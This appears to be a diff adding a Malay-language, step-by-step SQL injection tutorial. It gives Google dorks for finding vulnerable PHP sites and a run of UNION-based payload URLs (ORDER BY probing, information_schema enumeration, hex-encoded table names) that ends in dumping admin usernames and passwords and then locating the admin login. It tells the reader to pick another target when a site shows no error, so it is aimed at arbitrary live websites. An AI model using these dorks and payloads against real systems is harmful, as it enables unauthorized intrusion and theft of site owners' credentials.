@@ -1,0 +1,277 @@
+>>Info<< Kata kunci yang perlu diketahui ------------------------------- karakter : ', - comments : /*, -- ------------------------------- Makluman: "Information_schema" hanya befungsi untuk versi msql versi 5.x ke atas Google Dork yang akan di gunakan ialah -->
+
+ 
+
+ 
+
+"inurl:news.php?id="
+
+"inurl:index.php?id="
+
+"inurl:trainers.php?id="
+
+"inurl:buy.php?category="
+
+"news-article.php?id="
+
+"inurl:article.php?ID="
+
+"inurl:play_old.php?id="
+
+ 
+
+Langkah Pertama
+
+ 
+
+target/news.php?id=1
+
+---tambahkan karakter ' pada akhir url untuk lihat sama ada site itu vuln untuk
+
+sql injection atau pun tidak.
+
+ 
+
+contoh inject code :-
+
+ 
+
+target/news.php?id=1'
+
+atau
+
+target/news.php?id=-1
+
+ 
+
+Contoh pesan error :-
+
+warning: mysql_fetch_array(): supplied argument is not a valid MYSQL
+
+result resource in D:\inetpub\wwwroot\ajpower.net\html\news.php on line
+
+ 
+
+*Note. Kalau tidak ada pesan error, sebaiknya cari target lain.
+
+ 
+
+Langkah Kedua
+
+ 
+
+Cari jumlah table yang ada di dalam database.
+
+tambahkan : +order+by+1-- diakhir url
+
+ 
+
+Contoh:
+
+ 
+
+Code:
+
+target/news.php?id=1+order+by+1--
+
+atau
+
+target/news.php?id=1+order+by+1/* periksa secara bepringkat
+
+target/news.php?id=1+order+by+2/*
+
+target/news.php?id=1+order+by+3/*cari sehingga error keluar
+
+ 
+
+Untuk tutorial ini jumlah table yg diperolehi ialah 3.
+
+ 
+
+Langkah Ketiga
+
+ 
+
+Gunakan perintah Union untuk mengeluarkan nombor yang akan kita gunakan kemudian.
+
+perintah yang akan digunakan : +union+select+1,2,3-- diakhir url
+
+ 
+
+ 
+
+Contoh
+
+target/news.php?id=1+union+select+1,2,3--
+
+ 
+
+Contoh: angka 2 keluar.
+
+ 
+
+kemudian kita masukkan version() di angka (2),
+
+ 
+
+contoh:
+
+ 
+
+target/news.php?id=1+union+select+1,version(),3--
+
+ 
+
+dan paparan version akan tepapar di angka tersebut.
+
+Contoh:
+
+5.1.47-community-log
+
+ 
+
+------
+
+|info|
+
+------
+
+ 
+
+version() = untuk lihat version msql yang digunakan
+
+database() = untuk lihat name database yang digunakan
+
+ 
+
+Langkah Keempat
+
+ 
+
+untuk nampakkan nama2 table yang ada di web tersebut, perintah
+
+table_name letak di angka yang keluar tadi --> (2)
+
++from+information_schema.tables-- ---> letak di belakang angka yang terakhir.
+
+ 
+
+contoh:
+
+ 
+
+target/news.php?id=1+union+select+1,table_name,3+from+information_schema.tables--
+
+atau kita tambah perintah karekter - di depan angka pertama
+
+target/news.php?id=-1+union+select+1,table_name,3+from+information_schema.tables--
+
+ 
+
+Langkah KeLima
+
+ 
+
+Keluarkan kesemua isi yang ada di dalam table tersebut,
+
+ 
+
+group_concat(table_name) ---> letak di angka yang keluar tadi (2)
+
++from+information_schema.tables+where+table_schema=database()-- ---> Masukan selepas angka yang terakhir.
+
+ 
+
+Contoh:
+
+ 
+
+target/news.php?id=1+union+select+1,group_concat(table_name),3+from+
+
+information_schema.tables+where+table_schema=database()--
+
+ 
+
+Langkah Ke Enam
+
+ 
+
+Keluar kan kandungan yang ada didalam TABLE
+
+ 
+
+group_concat(column_name) ---> letak di angka yang keluar tadi(2)
+
++from+information_schema.columns+where+table_name=0xHasilConvertTextTableAdmin--
+
+ 
+
+(LETAK NAMA TABLE YANG SUDAH DI CONVERT KE HEXADECIMEL)
+
+ 
+
+------
+
+|info|
+
+------
+
+Website yang boleh digunakan untuk convert nama table ke hexadecimel ialah
+
+-----> www.piclist.com/techref/ascii.htm
+
+-----> www.centricle.com/tools/ascii-hex/
+
+ 
+
+Column yang akan kita gunakan sebagai contoh ialah table ADMIN
+
+dan hasil convert ialah 41444D494E
+
+ 
+
+Contoh:
+
+ 
+
+target/news.php?id=1+union+select+1,group_concat(column_name),3+from+
+
+information_schema.columns+where+table_name=0x41444D494E--
+
+ 
+
+Langkah Ketujuh
+
+ 
+
+Keluarkan hasil isi yang kita berjaya peroleh dari table Admin
+
+ 
+
+concat_ws(0x3a,"nama column yang terkandung dlm table ADMIN") ---> letak di angka yang keluar tadi(2)
+
++from+Admin-- --> asal column
+
+ 
+
+Contoh:
+
+ 
+
+target/news.php?id=1+union+select+1,concat_ws(0x3a,id,username,password),3+from+Admin--
+
+ 
+
+Dan kita akan peroleh username dan password admin untuk website tersebut.
+
+ 
+
+Langkah Terakhir:
+
+ 
+
+Cari Login untuk Admin Pages.
+
+ 
+
+*Hack To Learn, Not Learn To Hack
